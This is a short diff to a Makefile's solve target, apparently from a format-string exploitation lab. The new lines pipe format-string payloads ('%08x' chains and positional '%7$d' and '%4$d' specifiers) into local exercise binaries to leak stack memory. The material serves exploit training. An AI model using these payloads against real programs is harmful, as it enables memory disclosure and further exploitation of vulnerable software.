@@ -16,8 +16,14 @@ compile:
 
 solve:
 	@echo "\n0"
-	python -c "print hex(42)"
-	python -c 'print "AAAACOVFEFE"+"%08x"*64' | ./0-read.exe
+	python -c 'print "AAAA"+"-%08x"*20+"_%7\x24d"' | ./0-read.exe
+
+	@echo "\n1"
+	python -c 'print "_%4\x24d"' | ./1-short-read.exe
+
+	@echo "\n0"
+	python -c 'print "_%7\x24d"' | ./2-write.exe
+
 
 	@echo
 
